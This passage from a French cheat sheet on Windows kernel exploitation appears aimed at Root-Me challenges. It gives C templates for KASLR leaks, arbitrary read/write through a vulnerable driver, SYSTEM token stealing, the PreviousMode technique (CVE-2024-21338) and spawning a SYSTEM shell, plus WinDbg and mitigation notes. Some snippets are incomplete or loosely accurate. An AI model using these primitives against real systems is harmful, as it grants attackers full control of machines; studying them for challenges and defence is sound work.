// Gadgets classiques pour token stealing sans SMEP bypass :
// On fait tout en kernel, pas besoin de code userland
```

## Kernel Information Leak (KASLR bypass)

```c
// KASLR = Kernel Address Space Layout Randomization
// Nécessite de leaker le kernel base pour calculer les adresses

// Méthode 1 : NtQuerySystemInformation (non-admin requis)
SYSTEM_MODULE_INFORMATION smi;
NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &size);
// smi.Modules[0].ImageBase = adresse de ntoskrnl.exe

// Méthode 2 : EnumDeviceDrivers (accès bas-niveau)
LPVOID drivers[1024];
DWORD cbNeeded;
EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
// drivers[0] = base de ntoskrnl

// Méthode 3 : NtQueryIntervalProfile
// Permet de leaker une adresse kernel via timing sur certains systèmes

// Méthode 4 : Exploit arbitrary read pour lire le PEB/TEB kernel
// Via la vulnérabilité elle-même (IOCTL de lecture arbitraire)
```

## Arbitrary Read/Write Primitives

```c
// Pattern AAR (Arbitrary Address Read)
// IOCTL qui lit à une adresse fournie par l'utilisateur

ULONG64 kernel_read64(HANDLE hDevice, ULONG64 addr) {
    struct { ULONG64 addr; ULONG64 value; } req = {addr, 0};
    DeviceIoControl(hDevice, IOCTL_READ, &req, sizeof(req), 
                    &req, sizeof(req), &bytes, NULL);
    return req.value;
}

// Pattern AAW (Arbitrary Address Write)
void kernel_write64(HANDLE hDevice, ULONG64 addr, ULONG64 value) {
    struct { ULONG64 addr; ULONG64 value; } req = {addr, value};
    DeviceIoControl(hDevice, IOCTL_WRITE, &req, sizeof(req), 
                    NULL, 0, &bytes, NULL);
}

// Avec AAR/AAW : token stealing sans shellcode
ULONG64 system_eproc = find_eprocess_by_pid(hDevice, 4);
ULONG64 current_eproc = find_eprocess_by_pid(hDevice, GetCurrentProcessId());
ULONG64 system_token = kernel_read64(hDevice, system_eproc + TOKEN_OFFSET) & ~0xF;
kernel_write64(hDevice, current_eproc + TOKEN_OFFSET, system_token);
```

## Après élévation de privilèges : spawner SYSTEM shell

```c
// Une fois que notre token = SYSTEM token
void spawn_system_shell() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Lancer cmd.exe avec les nouveaux privilèges SYSTEM
    CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi
    );
    
    printf("[+] Shell lancé avec PID %d\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, INFINITE);
}
```

## WinKern debug→exploit workflow (source: Root-Me WinKern SSH)

```
1. Analyser le driver (.sys) avec IDA Pro ou Ghidra
   - Identifier les IOCTL handlers (DriverEntry → DispatchDeviceControl)
   - Chercher les vulnérabilités : buffer overflow, integer overflow, UAF

2. Identifier l'IOCTL code vulnérable
   - Calculer : IOCTL = CTL_CODE(DeviceType, Function, Method, Access)
   - Ou extraire via IDA du switch/case dans le handler

3. Reproduire la vulnérabilité localement
   - VM Windows avec WinDbg attaché (double VM ou kernel debugging)
   - Activer page heap : gflags /i target.exe +hpa

4. Développer l'exploit
   - Identifier offsets EPROCESS selon la version Windows fournie
   - Écrire le shellcode ou ROP chain

5. Transférer et tester
   - Sur Root-Me : souvent VM accessible via RDP ou exploit à soumettre
```

## WinDbg commandes utiles

```
// Kernel debugging
dt nt!_EPROCESS            // Structure EPROCESS
dt nt!_EPROCESS @$proc     // EPROCESS du process courant
!process 0 0               // Lister tous les process
!process 0 0 cmd.exe       // Process spécifique

// Offsets dynamiques
?? #FIELD_OFFSET(nt!_EPROCESS, Token)
?? #FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)

// Chercher SYSTEM process
.foreach (proc {!process 0 0 System}) { dt nt!_EPROCESS proc Token }

// Breakpoint sur IOCTL handler
bp \VulnDriver!DispatchDeviceControl
bp \VulnDriver!DeviceIoControl

// Examiner la pile
k                  // Call stack
kn                 // Call stack avec numéros
r                  // Registres
dq rsp L10         // Dump 10 qwords depuis RSP
```

## PreviousMode Write — Technique moderne (CVE-2024-21338)

**Source :** [github.com/hakaioffsec/CVE-2024-21338](https://github.com/hakaioffsec/CVE-2024-21338)  
**Concept :** Modifier `KTHREAD->PreviousMode` de `UserMode (1)` → `KernelMode (0)`.  
**Effet :** Toutes les vérifications `ProbeForRead`/`ProbeForWrite` sont bypassées → AAW parfait via `NtWriteVirtualMemory`.

```c
// KTHREAD offset (Windows 10 20H2 / Windows 11)
// +0x232 PreviousMode : UChar
// PsGetCurrentThread() ou GS:[0x188] → KTHREAD courant

// Étape 1 : Trouver l'adresse du PreviousMode dans le kernel
// Via NtQuerySystemInformation(SystemThreadInformation) + ETHREAD + KTHREAD
ULONG64 kthread_addr = get_kthread_addr();
ULONG64 previousmode_addr = kthread_addr + 0x232;

// Étape 2 : Écrire 0 à PreviousMode (via la vulnérabilité du driver)
// Exemple : driver avec write arbitraire via IOCTL
DeviceIoControl(hDevice, IOCTL_WRITE_BYTE,
                &previousmode_addr, sizeof(ULONG64),
                NULL, 0, &bytes, NULL);

// Étape 3 : Maintenant NtWriteVirtualMemory écrit dans le kernel !
ULONG64 system_token = get_system_token();
ULONG64 our_token_addr = get_current_process_token_addr();

NtWriteVirtualMemory(GetCurrentProcess(),
                     (PVOID)our_token_addr,
                     &system_token,
                     sizeof(ULONG64),
                     NULL);

// Étape 4 : Restaurer PreviousMode (pour stabilité)
UCHAR user_mode = 1;
NtWriteVirtualMemory(GetCurrentProcess(),
                     (PVOID)previousmode_addr,
                     &user_mode, 1, NULL);

// Étape 5 : Spawn SYSTEM shell
system("cmd.exe");
```

### Trouver KTHREAD address depuis userland (méthodes)

```c
// Méthode A : NtQuerySystemInformation + ETHREAD walking
SYSTEM_THREAD_INFORMATION sti;
NtQuerySystemInformation(SystemProcessInformation, buf, size, &ret);
// Trouver le thread courant via GetCurrentThreadId()
// ETHREAD = pointeur dans la liste + offset kernel
// KTHREAD = début de ETHREAD

// Méthode B : NtCurrentTeb()->Tib.Self via KPCR
// GS segment en kernel = KPCR → KPCR.Prcb.CurrentThread = KTHREAD
// Accessible indirectement via certaines fonctions NT non-documentées

// Méthode C : CreateToolhelp32Snapshot pour lister threads puis 
// cross-référencer avec NtQuerySystemInformation(SystemHandleInformation)
// pour obtenir l'adresse kernel de l'ETHREAD

// Méthode pratique CTF : si le driver a un read arbitraire (AAR)
// Lire GS:[0x188] → KTHREAD addr
ULONG64 kthread = kernel_read64(hDevice, gs_base + 0x188);
```

## Handle Table Exploitation

```c
// Handle Table : structure kernel qui mappe les handles aux objets
// Chaque process a une _HANDLE_TABLE dans l'_EPROCESS
// Corrompre la handle table → pointer un handle vers un objet arbitraire

// Offset dans _EPROCESS
// +0x418 ObjectTable : _HANDLE_TABLE*

// _HANDLE_TABLE_ENTRY (4 bytes en mode compact)
// GrantedAccess | ObjectHeader (encodé)

// Technique : via pool overflow corrompre ObjectHeader d'un file handle
// → accès à un fichier kernel protégé

// Alternative : corrompre le handle vers notre propre token
// → donner des privilèges supplémentaires
```

## Windows 11 Mitigations à connaître

```
VBS (Virtualization-Based Security) :
  → Hypervisor protège les pages de code kernel
  → Les ROP chains kernel doivent être dans des zones non-protégées
  
HVCI (Hypervisor-Protected Code Integrity) :
  → Empêche l'exécution de code non signé en kernel
  → Shellcode kernel traditionnel ne fonctionne plus
  → ROP uniquement (gadgets dans code signé)

CFG (Control Flow Guard) :
  → Vérifie les appels indirects en userland
  → En kernel : CET (Control-flow Enforcement Technology) sur Intel 11+
  
Protected Process Light (PPL) :
  → Certains process (LSASS, antivirus) ne peuvent pas être accédés
  → Requiert certificat Authenticode avec EKU spéciale

Shadow Stack (Intel CET) :
  → Stack supplémentaire en lecture seule pour les adresses de retour
  → Présent sur Windows 11 avec CPU compatible
  → Rend les attaques ROP classiques beaucoup plus difficiles
```

## Analyse d'un driver vulnérable (IDA/Ghidra workflow)

```bash
# 1. Trouver le DriverEntry et la dispatch routine
# IDA : Ctrl+G → DriverEntry
# Chercher : DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = handler

# 2. Analyser le IOCTL handler (DispatchDeviceControl)
# Pattern classique :
# IoGetCurrentIrpStackLocation(Irp)
# Parameters.DeviceIoControl.IoControlCode → switch/case
# Parameters.DeviceIoControl.InputBufferLength → taille input
# InputBuffer = Irp->AssociatedIrp.SystemBuffer (METHOD_BUFFERED)

# 3. Chercher les vulnérabilités classiques
# - memcpy sans vérification de taille → overflow
# - Accès à des pointeurs user fournis sans ProbeForRead → arbitrary read
# - Use-after-free dans les IRP handlers
# - Integer overflow dans les calculs de taille

# 4. Extraire les IOCTL codes
# Python script pour IDA :
# import idaapi, idc
# for ref in CodeRefsTo(handler_ea, True):
#     print(hex(idc.get_wide_dword(ref - 4)))  # Valeur du IOCTL avant le jump
```

## CTL_CODE pour identifier les IOCTLs

```c
// Macro Windows pour calculer les IOCTL codes
#define CTL_CODE(DeviceType, Function, Method, Access) ( \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))

// Méthodes de transfert
#define METHOD_BUFFERED   0
#define METHOD_IN_DIRECT  1
#define METHOD_OUT_DIRECT 2
#define METHOD_NEITHER    3

// Accès
#define FILE_ANY_ACCESS     0
#define FILE_READ_ACCESS    1
#define FILE_WRITE_ACCESS   2

// Exemple : IOCTL code = 0x222003
// → DeviceType=0x22, Function=0x800, Method=3 (NEITHER), Access=0
// CTL_CODE(0x22, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS) = 0x222003
```
